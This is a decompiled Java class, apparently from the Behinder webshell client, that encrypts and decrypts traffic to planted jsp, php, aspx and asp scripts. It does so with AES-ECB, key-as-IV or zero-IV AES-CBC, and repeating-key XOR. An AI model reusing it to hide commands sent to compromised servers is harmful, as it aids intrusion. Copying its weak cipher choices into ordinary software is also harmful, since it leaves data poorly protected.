package net.rebeyond.behinder.core;

import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Crypt {
   public static byte[] Encrypt(byte[] bs, String key) throws Exception {
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   public static byte[] Decrypt(byte[] bs, String key, int encryptType, String type) throws Exception {
      byte[] result = null;
      if (type.equals("jsp")) {
         try {
            result = DecryptForJava(bs, key);
         } catch (Exception var8) {
            var8.printStackTrace();
         }
      } else if (type.equals("php")) {
         result = DecryptForPhp(bs, key, encryptType);
      } else if (type.equals("aspx")) {
         try {
            result = DecryptForCSharp(bs, key);
         } catch (Exception var7) {
            var7.printStackTrace();
         }
      } else if (type.equals("asp")) {
         result = DecryptForAsp(bs, key);
      } else if (type.equals("native")) {
         try {
            result = DecryptForNative(bs, key);
         } catch (Exception var6) {
            var6.printStackTrace();
         }
      }

      return result;
   }

   public static byte[] DecryptForJava(byte[] bs, String key) throws Exception {
      int magicNum = getMagicNum(key);
      bs = Arrays.copyOfRange(bs, 0, bs.length - magicNum);
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(2, skeySpec);
      byte[] decrypted = cipher.doFinal(bs);
      return decrypted;
   }

   public static byte[] DecryptForNative(byte[] bs, String key) throws Exception {
      bs = Base64.getDecoder().decode(bs);
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(2, skeySpec);
      byte[] decrypted = cipher.doFinal(bs);
      return decrypted;
   }

   public static byte[] EncryptForCSharp(byte[] bs, String key) throws Exception {
      byte[] raw = key.getBytes("utf-8");
      IvParameterSpec iv = new IvParameterSpec(raw);
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      cipher.init(1, skeySpec, iv);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   public static byte[] DecryptForCSharp(byte[] bs, String key) throws Exception {
      byte[] raw = key.getBytes("utf-8");
      IvParameterSpec iv = new IvParameterSpec(raw);
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      cipher.init(2, skeySpec, iv);
      byte[] decrypted = cipher.doFinal(bs);
      return decrypted;
   }

   public static byte[] EncryptForPhp(byte[] bs, String key, int encryptType) throws Exception {
      byte[] encrypted = null;
      if (encryptType == Constants.ENCRYPT_TYPE_AES) {
         byte[] raw = key.getBytes("utf-8");
         SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
         cipher.init(1, skeySpec, new IvParameterSpec(new byte[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
         encrypted = cipher.doFinal(bs);
      } else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
         encrypted = DecryptForAsp(bs, key);
      }

      return encrypted;
   }

   public static byte[] EncryptForAsp(byte[] bs, String key) throws Exception {
      for(int i = 0; i < bs.length; ++i) {
         bs[i] ^= key.getBytes()[i + 1 & 15];
      }

      return bs;
   }

   public static byte[] DecryptForPhp(byte[] bs, String key, int encryptType) throws Exception {
      byte[] decrypted = null;
      if (encryptType == Constants.ENCRYPT_TYPE_AES) {
         byte[] raw = key.getBytes("utf-8");
         bs = Base64.getDecoder().decode(bs);
         SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
         cipher.init(2, skeySpec, new IvParameterSpec(new byte[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}));
         decrypted = cipher.doFinal(bs);
      } else if (encryptType == Constants.ENCRYPT_TYPE_XOR) {
         decrypted = DecryptForAsp(bs, key);
      }

      return decrypted;
   }

   public static byte[] DecryptForAsp(byte[] bs, String key) throws Exception {
      for(int i = 0; i < bs.length; ++i) {
         bs[i] ^= key.getBytes()[i + 1 & 15];
      }

      return bs;
   }

   public static byte[] Encrypt(byte[] bs, String key, String scriptType, int encryptType) throws Exception {
      byte[] result = null;
      switch (scriptType) {
         case "jsp":
            result = Encrypt(bs, key);
            break;
         case "php":
            result = EncryptForPhp(bs, key, encryptType);
            if (encryptType == Constants.ENCRYPT_TYPE_AES) {
               result = Base64.getEncoder().encode(result);
            }
            break;
         case "aspx":
            result = EncryptForCSharp(bs, key);
            break;
         case "asp":
            result = EncryptForAsp(bs, key);
      }

      return result;
   }

   private static int getMagicNum(String key) {
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      return magicNum;
   }
}
